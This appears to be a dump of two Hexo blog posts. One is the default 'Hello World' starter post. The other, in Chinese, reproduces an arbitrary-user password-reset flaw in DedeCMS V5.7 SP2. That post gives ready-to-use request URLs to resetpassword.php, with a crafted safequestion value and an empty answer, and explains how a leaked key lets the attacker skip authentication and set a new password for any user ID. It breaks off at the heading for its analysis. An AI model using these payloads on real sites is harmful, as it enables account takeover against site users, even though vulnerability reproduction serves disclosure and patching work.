posts.title: dede最新版任意用户密码重置
posts.slug: dede最新版任意用户密码重置
posts.text: 下载安装在dede官网下载最新版的V5.7 SP2正式版 复现安装完后注册两个账号如下： payload: 1http://x.x.x.x/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=1 id为用户对应的mid，以test2为例，访问如下链接： 1http://127.0.0.1/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=5 在这个过程中会依次发出若干个请求，记录如下请求包中的key字段。 将key拼接到如下跳转链接中，直接访问： 1http://127.0.0.1/member/resetpassword.php?dopost=getpasswd&id=1&key=A6bi6ZR9 发现绕过了用户认证，直接到了第二步： 修改密码为test，test： 1563790627118 登录成功： 1563790696119 分析

posts.title: Hello World
posts.text: Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment
